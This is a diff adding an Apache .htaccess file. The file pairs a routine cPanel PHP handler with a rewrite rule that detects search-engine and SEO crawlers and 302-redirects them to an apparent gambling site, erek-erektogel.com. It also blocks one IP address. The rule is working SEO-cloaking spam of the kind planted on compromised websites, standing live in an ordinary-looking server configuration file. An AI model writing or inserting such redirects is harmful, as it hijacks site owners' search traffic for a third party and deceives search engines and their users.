@@ -1,0 +1,20 @@
+<Files 403.shtml>
+order allow,deny
+allow from all
+</Files>
+
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+
+    # Deteksi User-Agent bot
+    RewriteCond %{HTTP_USER_AGENT} "(googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog)" [NC]
+    RewriteRule ^(.*)$ https://erek-erektogel.com/ [R=302,L]
+</IfModule>
+
+deny from 187.40.232.70
+# php -- BEGIN cPanel-generated handler, do not edit
+# Set the “ea-php82” package as the default “PHP” programming language.
+<IfModule mime_module>
+  AddHandler application/x-httpd-ea-php82 .php .php8 .phtml
+</IfModule>
+# php -- END cPanel-generated handler, do not edit
